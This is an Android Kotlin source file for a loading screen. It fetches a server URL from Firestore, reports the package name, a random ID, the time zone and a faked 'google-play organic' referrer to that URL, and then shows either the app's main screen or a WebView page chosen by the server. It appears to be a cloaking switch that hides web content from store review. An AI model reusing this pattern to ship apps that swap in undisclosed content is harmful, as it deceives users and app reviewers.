package com.template

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.FirebaseApp
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.firestore.ktx.getField
import com.google.firebase.ktx.Firebase
import com.template.databinding.ActivityLoadingBinding
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.plugins.*
import io.ktor.client.request.*
import io.ktor.client.statement.*
import io.ktor.http.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.*

class LoadingActivity : AppCompatActivity() {

    private var _binding: ActivityLoadingBinding? = null
    private val binding: ActivityLoadingBinding
        get() = _binding ?: throw RuntimeException("ActivityLoadingBinding == null")

    private lateinit var preferences: SharedPreferences
    private lateinit var analytics: FirebaseAnalytics

    private val db = Firebase.firestore

    private var randomID = UUID.randomUUID()

    private var timeZone: String = TimeZone.getDefault().id

    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        FirebaseApp.initializeApp(this)
        _binding = ActivityLoadingBinding.inflate(layoutInflater)
        preferences = getSharedPreferences("LINKS", Context.MODE_PRIVATE)
        setContentView(binding.root)
        init()
        startApp()

    }


    private suspend fun ktor() {

        val packageName = applicationContext.packageName.toString()
        val baseUrl = preferences.getString(LINK_KEY, null)

        val client = HttpClient(CIO) {
            BrowserUserAgent()
        }

        val response: HttpResponse = client.get(
            baseUrl ?: throw RuntimeException("url is null")
        ) {

            parameter(PACKAGE_ID_QUERY_PARAM, packageName)
            parameter(USER_ID_QUERY_PARAM, randomID)
            parameter(TIME_ZONE_QUERY_PARAM, timeZone)
            parameter(GETR_QUERY_PARAM, LAST)

        }

        when (response.status) {
            HttpStatusCode.OK -> {
                saveLinkPref(FINAL_URL, response.bodyAsText().trim())
                launchWebViewActivity()
            }
            else -> {
                putFirst()
                launchMainActivity()
            }
        }
    }

    private fun response() {
        CoroutineScope(Dispatchers.IO).launch {
            ktor()
        }
    }

    private fun init() {
        analytics = FirebaseAnalytics.getInstance(this)
    }

    private fun fireBaseFireStore() {
        val docRef = db.collection("database").document("check")
        docRef.get().addOnSuccessListener { document ->
            if (document != null) {
                val result = document.getField<String>("link")
                saveLinkPref(LINK_KEY, result.toString())
                if (fireStoreUrl()) {
                    CoroutineScope(Dispatchers.IO).launch {
                        response()
                    }
                    putFirst()
                } else {
                    putFirst()
                    launchMainActivity()
                }
            }
        }

        docRef.get().addOnFailureListener {
            putFirst()
            launchMainActivity()
        }
    }

    private fun network(context: Context): Boolean {
        val connect = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val internet = connect.activeNetwork ?: return false
            val activeNetwork = connect.getNetworkCapabilities(internet) ?: return false
            return when {
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
                else -> false
            }
        } else {
            val network = connect.activeNetworkInfo ?: return false
            return network.isConnected
        }
    }

    private fun saveLinkPref(keys: String, value: String) {
        val pref = preferences.edit()
        pref?.putString(keys, value)
        pref?.apply()
    }

    private fun checkFirst(): Boolean {
        return preferences.getBoolean(FIRST_TIME, true)
    }

    private fun putFirst(){
        val insertBoolean = preferences.edit()
        insertBoolean.putBoolean(FIRST_TIME, false)
        insertBoolean.apply()
    }

    private fun startApp() {
        if (isFinalExist() && network(this)) {
            launchWebViewActivity()
        } else if (checkFirst() && network(this)) {
            fireBaseFireStore()
        } else if (checkFirst() && !network(this)) {
            launchMainActivity()
        } else if (!network(this)) {
            launchMainActivity()
        }
    }

    private fun isFinalExist(): Boolean {
        val resultFinal = preferences.getString(FINAL_URL, null)
        return resultFinal != null
    }

    private fun fireStoreUrl(): Boolean {
        val resultFireStore = preferences.getString(LINK_KEY, null)
        return resultFireStore != null
    }

    private fun launchWebViewActivity() {
        startActivity(Intent(this, WebActivity::class.java))
        this.finish()
    }

    private fun launchMainActivity() {
        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        this.finish()
    }

    override fun onDestroy() {
        super.onDestroy()
        _binding = null
    }

    companion object {
        const val LINK_KEY = "link"
        const val FIRST_TIME = "first_time"
        const val FINAL_URL = "final_url"
        const val PACKAGE_ID_QUERY_PARAM = "packageid"
        const val USER_ID_QUERY_PARAM = "usserid"
        const val TIME_ZONE_QUERY_PARAM = "getz"
        const val GETR_QUERY_PARAM = "getr"
        const val LAST = "utm_source=google-play&utm_medium=organic"
    }

}